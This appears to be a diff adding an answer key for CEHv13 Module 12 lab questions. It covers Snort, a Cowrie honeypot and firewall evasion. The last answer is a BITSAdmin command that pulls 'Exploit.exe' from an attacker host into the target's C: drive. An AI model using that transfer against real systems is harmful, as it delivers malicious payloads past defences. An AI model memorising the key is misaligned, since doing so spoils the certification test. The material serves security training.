@@ -1,0 +1,28 @@
+# MODULE = 12 
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+Question 12.1.1.1
+Install Snort in the Windows Server 2019 machine. The necessary files are available at Z:\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort. Configure and initialize the Snort tool. Initialize the Snort interfaces and attack a target machine from the attacker machine (10.10.1.11) to check whether Snort detects it or not. Enter the Snort command to view the index number of the Ethernet driver
+
+Ans = snort -W 
+$ snort * Linux [To detect malicious traffic]
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+Question 12.1.2.1
+In ubuntu machine (10.10.1.9) setup Cowrie honeypot to capture incoming malicious traffic on port 22 from the attacker's machine (10.10.1.13). Enter the port number to which the port 22 traffic is redirected to. 
+
+Ans = 2222
+$ cowrie * Linux [Honeypot]
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+Question 12.2.1.1
+Use BITSAdmin to evade firewall and transfer malicious file into the target machine (Windows Server 2019). Enter the BitsAdmn command that is used to transfer malicious file in this lab 
+
+Ans = bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+
